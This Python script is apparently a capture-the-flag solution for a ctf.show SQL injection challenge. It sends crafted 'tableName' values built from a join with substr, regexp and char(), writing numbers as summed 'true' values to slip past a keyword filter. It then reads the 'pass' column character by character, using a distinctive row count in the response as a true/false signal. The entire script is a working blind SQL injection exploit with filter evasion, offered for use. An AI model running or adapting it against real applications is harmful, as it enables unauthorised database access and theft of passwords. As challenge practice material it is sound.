import requests

url = "http://6b634259-047c-48ae-b97a-56444bb1fd9e.chall.ctf.show:8080/select-waf.php"

flag = 'flag is '


def createNum(n):
    num = 'true'
    if n == 1:
        return 'true'
    else:
        for i in range(n - 1):
            num += "+true"
    return num


for i in range(45):
    if i <= 5:
        continue
    for j in range(127):
        data = {
            "tableName": f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{createNum(i)},{createNum(1)})regexp(char({createNum(j)})))"
        }
        r = requests.post(url, data=data)
        if r.text.find("$user_count = 43;") > 0:
            if chr(j) != ".":
                flag += chr(j)
                print(data)
                print(f'j={j},chr={chr(j)}')
                # print(flag)
                print(flag.lower())
                if chr(j) == "}":
                    exit(0)
                break